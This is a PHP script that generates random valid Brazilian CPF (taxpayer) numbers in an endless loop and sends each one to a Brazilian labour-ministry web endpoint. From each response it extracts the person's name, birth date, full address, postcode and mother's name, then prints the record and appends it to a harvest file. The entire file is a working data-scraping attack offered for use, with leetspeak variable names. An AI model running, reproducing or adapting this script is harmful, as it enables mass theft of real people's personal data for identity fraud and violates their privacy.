	<?php
	
/*
Desenvolvido por Matheus Drummond Barbosa
*/

function mod($dividendo,$divisor)
{
	return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function cpf($compontos)
{
	$n1 = rand(0,9);
	$n2 = rand(0,9);
	$n3 = rand(0,9);
	$n4 = rand(0,9);
	$n5 = rand(0,9);
	$n6 = rand(0,9);
	$n7 = rand(0,9);
	$n8 = rand(0,9);
	$n9 = rand(0,9);
	$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
	$d1 = 11 - ( mod($d1,11) );
	
	if ( $d1 >= 10 )
		$d1 = 0;
	
	$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
	$d2 = 11 - ( mod($d2,11) );
	
	if ($d2>=10) 
		$d2 = 0;
	
	$retorno = '';
	if ($compontos==1) 
		$retorno = ''.$n1.$n2.$n3.".".$n4.$n5.$n6.".".$n7.$n8.$n9."-".$d1.$d2;
	else 
		$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;
	
	return $retorno;
}

function G3Td4Ta ($c0nt3ntz, $qU3ry) 
{
	$n3wC0nT3nTzZ = explode($qU3ry, $c0nt3ntz);
	$n3wC0nT3nTzZ = explode('"', $n3wC0nT3nTzZ[1]);
	$n3wC0nT3nTzZ = trim($n3wC0nT3nTzZ[0]);
	if (!empty($n3wC0nT3nTzZ))
		return $n3wC0nT3nTzZ;
	return null;
}

while (1)
{
	$CpFz = cpf(0);
	if (strlen($CpFz) > 10) 
	{
		$h4nDl3 = curl_init("http://www.juventudeweb.mte.gov.br/pnpepesquisas.asp?acao=consultar+cpf&cpf=". $CpFz);
		curl_setopt($h4nDl3, CURLOPT_HEADER, false);
		curl_setopt($h4nDl3, CURLOPT_RETURNTRANSFER, true);
		$r3zzP0nS3 = curl_exec($h4nDl3);
		curl_close($h4nDl3);
		
		$f1Nn4Lr3Spz = "";
		if (strstr($r3zzP0nS3, 'NRCPF="')) 
			$f1Nn4Lr3Spz .= "CPF: ". G3Td4Ta($r3zzP0nS3, 'NRCPF="');
		if (strstr($r3zzP0nS3, 'NOPESSOAFISICA="')) 
			$f1Nn4Lr3Spz .= " - N0M3: ". G3Td4Ta($r3zzP0nS3, 'NOPESSOAFISICA="');
		if (strstr($r3zzP0nS3, 'DTNASCIMENTO="')) 
			$f1Nn4Lr3Spz .= " - N45C1M3NT0: ". G3Td4Ta($r3zzP0nS3, 'DTNASCIMENTO="');
		if (strstr($r3zzP0nS3, 'NOLOGRADOURO="')) 
			$f1Nn4Lr3Spz .= " - L0C4L1D4D3: ". G3Td4Ta($r3zzP0nS3, 'NOLOGRADOURO="');
		if (strstr($r3zzP0nS3, 'NRLOGRADOURO="')) 
			$f1Nn4Lr3Spz .= " - NUM3R0: ". G3Td4Ta($r3zzP0nS3, 'NRLOGRADOURO="');
		if (strstr($r3zzP0nS3, 'DSCOMPLEMENTO="')) 
			$f1Nn4Lr3Spz .= " - C0MPL3M3NT0: ". G3Td4Ta($r3zzP0nS3, 'DSCOMPLEMENTO="');
		if (strstr($r3zzP0nS3, 'NOBAIRRO="')) 
			$f1Nn4Lr3Spz .= " - B41RR0: ". G3Td4Ta($r3zzP0nS3, 'NOBAIRRO="');
		if (strstr($r3zzP0nS3, 'NRCEP="')) 
			$f1Nn4Lr3Spz .= " - C3P: ". G3Td4Ta($r3zzP0nS3, 'NRCEP="');
		if (strstr($r3zzP0nS3, 'NOMUNICIPIO="')) 
			$f1Nn4Lr3Spz .= " - MUN1C1P10: ". G3Td4Ta($r3zzP0nS3, 'NOMUNICIPIO="');
		if (strstr($r3zzP0nS3, 'SGUF="')) 
			$f1Nn4Lr3Spz .= " - UF: ". G3Td4Ta($r3zzP0nS3, 'SGUF="');
		if (strstr($r3zzP0nS3, 'NOMAE="')) 
			$f1Nn4Lr3Spz .= " - N0M3 M43: ". G3Td4Ta($r3zzP0nS3, 'NOMAE="');
		$f1Nn4Lr3Spz .= "\n";
		
		if (strlen($f1Nn4Lr3Spz) > 10) 
		{
			echo $f1Nn4Lr3Spz;
			file_put_contents('d4d0zzH3r3z.txt', $f1Nn4Lr3Spz, FILE_APPEND);
		}
	}
}

?>
